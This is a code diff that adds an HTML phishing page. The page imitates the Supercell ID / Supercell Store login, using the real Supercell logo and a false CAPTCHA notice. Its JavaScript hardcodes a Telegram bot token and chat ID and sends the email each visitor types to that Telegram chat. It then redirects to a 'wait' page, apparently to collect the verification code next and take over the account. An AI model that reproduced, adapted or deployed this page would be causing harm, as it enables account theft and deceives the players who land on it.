@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Supercell ID Login</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome (optional) -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <script>
+    async function sendEmailToTelegram(event) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const botToken = '7683535358:AAFmqpo4E2a2_IBQE0weLkmKZKCnXBxlZPE'; // <-- Insert your bot token here
+      const chatId = '@cjcjndskndmsmdn';     // <-- Insert your chat ID here
+      const message = `Email address: ${email}`;
+      
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      
+      try {
+        await fetch(url);
+        window.location.href = 'wait.html'; // Redirect page after code is sent
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+  </script>
+</head>
+<body class="bg-blue-900 flex items-center justify-center min-h-screen px-4">
+  <!-- Card Container -->
+  <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+    <!-- Top Section: Sign In / Verify labels and progress bar -->
+    <div class="flex items-center justify-between mb-2">
+      <span class="text-gray-700 font-medium">Sign In</span>
+      <span class="text-gray-700 font-medium">Verify</span>
+    </div>
+    <div class="w-full bg-gray-200 rounded-full h-2.5 mb-4">
+      <!-- Adjust the progress bar width as needed (style="width: 50%") -->
+      <div class="bg-gradient-to-r from-blue-500 to-green-400 h-2.5 rounded-full" style="width: 50%;"></div>
+    </div>
+    
+    <!-- Logo and Title -->
+    <div class="text-center mb-4">
+      <img
+        alt="Supercell ID logo"
+        class="mx-auto mb-4 w-24"
+        src="https://accounts.supercell.com/static/appicons/store.png"
+      />
+      <h1 class="text-xl font-bold">Supercell Store Login</h1>
+      <p class="text-gray-600 text-sm">Enter your email to receive a verification code.</p>
+    </div>
+    
+    <!-- Form -->
+    <form onsubmit="sendEmailToTelegram(event)">
+      <div class="mb-4">
+        <input
+          class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-base"
+          id="email"
+          type="email"
+          placeholder="Enter your email address"
+          required
+        />
+      </div>
+      <p class="text-xs text-gray-600 mb-4 text-center">
+        This site is protected by CAPTCHA. Google's 
+        <a class="text-blue-500" href="#">Privacy Policy</a> and 
+        <a class="text-blue-500" href="#">Terms of Service</a> apply.
+      </p>
+      <div class="flex flex-col space-y-3">
+        <button
+          class="w-full bg-blue-500 text-white py-3 rounded-lg text-base font-semibold hover:bg-blue-600 active:bg-blue-700"
+          type="submit"
+        >
+          SIGN IN
+        </button>
+        <button
+          class="w-full border border-gray-300 text-gray-700 py-3 rounded-lg text-base hover:bg-gray-100 active:bg-gray-200"
+          type="button"
+          onclick="window.history.back()"
+        >
+          GO BACK
+        </button>
+      </div>
+    </form>
+    
+    <!-- Footer Link -->
+    <div class="text-center mt-4">
+      <a class="text-blue-500" href="#">Want to register for Supercell ID?</a>
+    </div>
+  </div>
+</body>
+</html>
